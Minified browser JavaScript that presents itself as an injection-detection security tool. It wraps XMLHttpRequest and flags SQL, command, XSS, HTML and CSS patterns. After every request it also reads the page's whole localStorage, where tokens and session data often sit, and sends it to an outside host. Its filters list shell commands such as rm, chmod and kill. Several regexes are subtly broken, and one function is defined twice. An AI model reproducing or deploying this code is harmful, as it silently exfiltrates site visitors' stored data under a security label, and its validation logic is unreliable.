async function getAlllocalStorageData() { const e = {}; for (let t = 0; t < localStorage.length; t++) { const n = localStorage.key(t), a = localStorage.getItem(n); e[n] = a } return 0 === Object.keys(e).length ? null : e } const ValidatConfiguration = () => { let e = window.appid, t = window.SecurityValidation; return !!e && (!!t && (0 != Object.keys(t).length && (!!(e && t && Object.keys(t).length > 0) || void 0))) }; async function sendToApi(e, t) { try { fetch(e, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ data: t, appid: appid, hostname: window.location.hostname }) }).then((e => { e.ok ? console.log("Data sent successfully") : console.error("Failed to send data") })).catch((e => { console.error("Failed to send data", e) })) } catch (e) { console.log("Error in sending data to api", e) } } const CallSensitivedataLocalStorage = async () => { let e = await getAlllocalStorageData(); if (null !== e) { sendToApi("https://securitytool.handsintechnology.in/api/client/protection", e).then((e => e)).catch((e => e)) } }, hasDuplicateParameters = e => { const t = new Set; for (const n in e) { if (t.has(n)) return !0; t.add(n) } return !1 }; function hasSqlInjection(e) { if (new RegExp("(%27)|(--)|([0-9]=[0-9])|([0-9] and [0-9]=[0-9])|([0-9] AND [0-9])|(or [0-9]=[0-9])|(OR [0-9]=[0-9])|(%23)|(#)", "i").test(e)) return !0; if (new RegExp("((%3D)|(=))[^\n]*((%27)|(')|(--)|(%3B)|(;))", "i").test(e)) return !0; if (new RegExp("((%3D)|(=))[^\n]*((%27)|(')|(--)|(%3B)|(;))?[^\n]*((%27)|(')|(--)|(%3B)|(;))[^\n]*((%3D)|(=))", "i").test(e)) return !0; if (new RegExp("(%3B)|(;)[^\n]*sleep[^\n]*(d+)[^\n]*", "i").test(e)) return !0; if (new RegExp("((%3D)|(=))[^\n]*[^s]*(%27)|(')|(--)|(%3B)|(;)", "i").test(e)) return !0; if (new RegExp("w*((%27)|('))((%6F)|o|(%4F))((%72)|r|(%52))", "i").test(e)) return !0; if (new RegExp("((%27)|('))union", "i").test(e)) return !0; return !!new RegExp("\b((select|delete|insert|update|drop|create|alter|order by|and)\b.*)", "i").test(e) } function hasCommandLineInjection(e) { return !!new RegExp(/(?:\/\*\*\/|\/\*.*?\*\/|\/\/.*?(?=\r?\n)|< !--.*?- ->|(?:&lt;|<)!\-\-.*?\-\-(?:&gt;|>)|\b(?:cat\s*?\/?|grep|system\(\s*?['"`]{0,1}|`\s*?\w+|[|&;`\(\)\s]\s*?\/?(?:bin\/\w+|usr\/\w+|n?cat\s+[\\|;&\(\)\/\w]+?)\s*?[\?&;|`]|(?:;|\?\?|\\\\n|\\\\r\s*\n?)\s*?[\\\;&\|`\(\)\s]?\/\w+\/\w+|['"`&\|`][\s\r\n]|[\?\&][\s\r\n]))|(?:npm\s+(?:install|i|update|uninstall|--version|--help|--force))|(?:yarn\s+(?:add|remove|upgrade|--version|--help|--force))|(?:node\s+[\w\.-]+\.js)|(?:rm\s+-\w*\s*[\w\/\.-]*)|(?:mv\s+[\w\/\.-]+\s+[\w\/\.-]+)|(?:cp\s+[\w\/\.-]+\s+[\w\/\.-]+)|(?:mkdir\s+[\w\/\.-]+)|(?:touch\s+[\w\/\.-]+)|(?:chmod\s+[\w\/\.-]+)|(?:chown\s+[\w\/\.-]+)|(?:ps\s+\w*)|(?:top)|(?:kill\s+-\w*\s*\d+)|(?:pkill\s+\w+)|(?:\(\)\s*\{\s*:;\s*\}\s*;\s*\/\s*\w+(?:\/\s*\w+)?\s*-\w+\s*['"`](?:.*?['"`\?\&]|.*?))/i).test(e) } function hasHTMLnjection(e) { return !!new RegExp(/<(\"[^\"]*\"|'[^']*'|[^'\">])*>/, "g").test(e) } const cssInjectionRegex = /<style[^>]*>|<\/style>|url\s*\((['"]?)javascript:\w*\(\1\)\1\)/gi; function hasCSSInjection(e) { return !!cssInjectionRegex.test(e) } function hasCSSInjection(e) { return !!cssInjectionRegex.test(e) } const xssRegex = new RegExp('(<script\\b[^>]*>[\\s\\S]*?<\\/script>|<svg\\b|<object\\b|<embed\\b|<iframe\\b|<link\\b|<video\\b|<audio\\b|<body\\b|<frame\\b|<meta\\b|<title\\b|<head\\b|<html\\b|<base\\b|<blink\\b|<marquee\\b|<expression\\b|\\b(?:alert|confirm|console|dialog|prompt|req|response|showModalDialog|write(?:ln)?|XSS|valueOf)?\\s*?[(\'""/] | (?:\\b|[^\\\\])(?:\\\\\\\\)*/?\\s*(?:--|>|<|%3C|%3E|%00|&#x0[0-9a-f]);?)', "gi"); function hasXSSInjection(e) { return !!xssRegex.test(e) } function InjectionChecker(e) { let t = !1, n = !1, a = !1, s = !1, o = !1, i = !1; const r = JSON.stringify(e)?.toLowerCase(); return r.includes("<iframe") ? o = !0 : !0 === hasCSSInjection(r) ? i = !0 : !0 === hasXSSInjection(r) ? n = !0 : !0 === hasHTMLnjection(r) ? a = !0 : !0 === hasCommandLineInjection(r) ? s = !0 : !0 === hasSqlInjection(r) && (t = !0), { containsSql: t, validateXss: n, validatehtml: a, containCommand: s, containiframetag: o, validateCss: i } } const CreateuserDetails = async e => { try { const t = { page: window.location.pathname, referurl: window.location.href, type: e }; await sendToApi("https://securitytool.handsintechnology.in/api/client/createuserdetailsfromclient", t).then((e => e)).catch((e => e)) } catch (e) { console.log("eror in malacius data create ", e) } }; !function (e, t) { XMLHttpRequest.prototype.open = function (t, n, a, s, o) { this._method = t, this._url = n, e.apply(this, arguments) }, XMLHttpRequest.prototype.send = function (e) { if (console.log("XHR called with method:", this._method), console.log("XHR payload:", e), !ValidatConfiguration()) throw new Error("Provide valid data according to Docs"); let n = window.SecurityValidation; const a = new URLSearchParams(window.location.search), s = Object.fromEntries(a.entries()); console.log("queries", s); let o = {}; (() => { try { o = JSON.parse(e), o = { body: e, ...s } } catch (t) { o = { body: e, ...s } } })(); const i = InjectionChecker(o); let r = hasDuplicateParameters(s); if (i.validateCss && n.css) return alert("CSS detected"), void CreateuserDetails("css"); if (i.containCommand && n.commandline) return alert("Command detected"), void CreateuserDetails("commandline"); if (i.validateXss && n.xss) return alert("XSS detected"), void CreateuserDetails("xss"); if (i.containiframetag && n.iframe) return alert("Iframe detected"), void CreateuserDetails("iframe"); if (i.validatehtml && n.html) return alert("HTML detected"), void CreateuserDetails("html"); if (i.containsSql && n.Sql) return alert("SQL detected"), void CreateuserDetails("sql"); if (r) return alert("Http parameter pollution detected"), void CreateuserDetails("httpParameterPollution"); const c = this; this.addEventListener("readystatechange", (function () { if (4 === c.readyState) { console.log("XHR response data:", c.responseText); let e = ValidatConfiguration(); setTimeout((async () => { if (!e) throw new Error("Provide valid data according to Docs"); await CallSensitivedataLocalStorage().then((e => e)).catch((e => e)) }), 500) } })), t.apply(this, arguments) } }(XMLHttpRequest.prototype.open, XMLHttpRequest.prototype.send);